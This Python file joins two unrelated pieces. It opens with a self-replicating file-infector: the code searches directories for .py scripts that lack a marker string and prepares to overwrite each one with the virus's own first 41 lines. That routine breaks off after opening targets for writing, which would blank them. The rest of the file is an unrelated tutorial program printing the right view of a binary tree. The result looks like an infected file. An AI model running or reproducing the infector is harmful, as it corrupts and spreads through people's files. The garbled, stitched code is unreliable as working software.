#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 

# Python3 program to print right 
# view of Binary Tree
from collections import deque
  
# A binary tree node
class Node:
      
    # A constructor to create a new 
    # Binary tree Node
    def __init__(self, val):
        self.data = val
        self.left = None
        self.right = None
  
# Function to print Right view of
# binary tree
def rightView(root):
      
    if root is None:
        return
  
    q = deque()
    q.append(root)
  
    while q:
          
        # Get number of nodes for each level
        n = len(q)
  
        # Traverse all the nodes of the 
        # current level
  
        while n > 0:
            n -= 1
              
            # Get the front node in the queue
            node = q.popleft()
  
            # Print the last node of each level
            if n == 0:
                print(node.data, end = " ")
  
            # If left child is not null push it 
            # into the queue
            if node.left:
                q.append(node.left)
  
            # If right child is not null push
            # it into the queue
            if node.right:
                q.append(node.right)
  
# Driver code
  
# Let's construct the tree as
# shown in example
root = Node(1)
root.left = Node(2)
root.right = Node(3)
root.left.left = Node(4)
root.left.right = Node(5)
root.right.left = Node(6)
root.right.right = Node(7)
root.right.left.right = Node(8)
  
rightView(root)
  
# This code is contributed by Pulkit Pansari
'''
Time Complexity: O(n) - Where n is the number of nodes in the binary tree
Space Complexity: O(n) - since using auxiliary space for queue
'''